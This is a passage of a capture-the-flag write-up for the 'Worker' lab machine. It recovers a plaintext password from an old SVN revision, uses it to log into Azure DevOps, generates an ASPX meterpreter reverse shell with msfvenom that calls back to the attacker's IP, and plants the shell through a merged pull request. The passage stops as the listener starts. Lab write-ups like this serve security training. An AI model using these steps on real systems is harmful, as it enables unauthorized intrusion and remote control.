plain">URL: svn://worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Relative URL: ^/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Repository Root: svn://worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Revision: 5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Node Kind: directory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Last Changed Author: nathen</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Last Changed Rev: 5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Last Changed Date: 2020-06-20 15:52:00 +0200 (Sat, 20 Jun 2020)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s use the command to <a href="http://svnbook.red-bean.com/en/1.8/svn.ref.svn.c.list.html" target="_blank" rel="noopener noreferrer">list directory entries in the repository</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ svn list svn://worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dimension.worker.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">moved.tx</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s <a href="http://svnbook.red-bean.com/en/1.8/svn.ref.svn.c.export.html" target="_blank" rel="noopener noreferrer">export a clean directory tree from the repository specified by URL</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ mkdir svn &amp;&amp; cd svn &amp;&amp; svn export --force svn://worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/LICENSE.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/README.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/css</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/css/fontawesome-all.min.css</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/css/main.css</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/css/noscript.css</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/js</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/js/breakpoints.min.js</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/js/browser.min.js</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/js/jquery.min.js</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/js/main.js</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/js/util.js</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/base</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/base/_page.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/base/_reset.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/base/_typography.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components/_actions.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components/_box.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components/_button.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components/_form.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components/_icon.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components/_icons.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components/_image.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components/_list.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/components/_table.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/layout</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/layout/_bg.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/layout/_footer.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/layout/_header.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/layout/_main.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/layout/_wrapper.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/libs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/libs/_functions.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/libs/_mixins.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/libs/_vars.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/libs/_vendor.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/main.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/sass/noscript.scss</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/images</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/images/bg.jpg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/images/overlay.png</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/images/pic01.jpg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/images/pic02.jpg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/images/pic03.jpg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    dimension.worker.htb/index.html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">A    moved.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Exported revision 5.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s see the first one, which is explicit:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat moved.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">This repository has been migrated and will no longer be maintained here.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">You can find the latest version at: http://devops.worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">// The Worker team :)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>On the other repository we can find a showcase website that is listing some
projects and that can give us new sub-domains:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lynx -dump -listonly -nonumbers dimension.worker.htb/index.html | grep http</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://alpha.worker.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://cartoon.worker.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://lens.worker.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://solid-state.worker.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://spectral.worker.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://story.worker.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">https://html5up.net/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we go at <a href="http://devops.worker.htb" target="_blank" rel="noopener noreferrer">http://devops.worker.htb</a> it ask some credentials for basic auth.
But we have none yet.</p><p>But we saw earlier there was 5 revisions so there may be information in a
previous revision.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ svn list -r 3 svn://worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">deploy.ps1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dimension.worker.htb/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Cool, we have found a powershell script.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ svn checkout -r 3 svn://worker.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>deploy.ps1</code></p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$user = &quot;nathen&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># NOTE: We cant have my password here!!!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$plain = &quot;&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$pwd = ($plain | ConvertTo-SecureString)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$args = &quot;Copy-Site.ps1&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Start-Process powershell.exe -Credential $Credential -ArgumentList (&quot;-file $args&quot;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>No password here, let&#x27;s check another revision:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ svn checkout -r 2 svn://worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">U    deploy.ps1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Checked out revision 2.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>deploy.ps1</code></p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$user = &quot;nathen&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$plain = &quot;wendel98&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$pwd = ($plain | ConvertTo-SecureString)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$args = &quot;Copy-Site.ps1&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Start-Process powershell.exe -Credential $Credential -ArgumentList (&quot;-file $args&quot;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This time the password is here. We can connect with those credentials to
<a href="http://devops.worker.htb/" target="_blank" rel="noopener noreferrer">http://devops.worker.htb/</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-azure-devops">Exploiting Azure DevOps<a href="#exploiting-azure-devops" class="hash-link" aria-label="Direct link to Exploiting Azure DevOps" title="Direct link to Exploiting Azure DevOps">​</a></h2><p><img loading="lazy" src="https://i.imgur.com/Y9qf4pD.png" class="img_ev3q"></p><p>We have access to a repository <a href="http://devops.worker.htb/ekenas/SmartHotel360" target="_blank" rel="noopener noreferrer">http://devops.worker.htb/ekenas/SmartHotel360</a></p><p>Look at the different projects we have access to:</p><p><img loading="lazy" src="https://i.imgur.com/g1vieWd.png" class="img_ev3q"></p><p>A lot of them are matching the sub-domains we found earlier</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">alpha.worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cartoon.worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lens.worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">solid-state.worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">spectral.worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">story.worker.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>All those domains are hosting a web application and we can control the source,
so we&#x27;ll be able to upload a reverse shell to the master branch and access it
wia the web application.</p><p>First, let&#x27;s generate an ASPX reverse shell:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f aspx &gt; cyfun.aspx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Found 1 compatible encoders</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Attempting to encode payload with 1 iterations of generic/none</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">generic/none succeeded with size 510 (iteration=0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">generic/none chosen with final size 510</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload size: 510 bytes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Final size of aspx file: 3663 bytes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Here a few steps I won&#x27;t details too much.</p><ol><li>Select a project, eg. Alpha</li><li>Create a new branch</li><li>Upload the reverse shell to the branch (eg. in assets folder)</li><li>Create a PR</li><li>Match merge policies: approve and link a work item</li><li>Complete the PR (merge)</li></ol><p>Start a listener:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 exploit(multi/handler) &gt; options</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module options (exploit/multi/handler):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name  Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----  ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name      Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----      ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   LHOST     10.10.14.174     yes       The listen address (an interface may be specified)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   LPORT     9999             yes       The listen port</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Exploit target:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Id  Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   --  ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0   Wildcard Target</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 exploit(multi/handler) &gt; run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Started reverse TCP handler 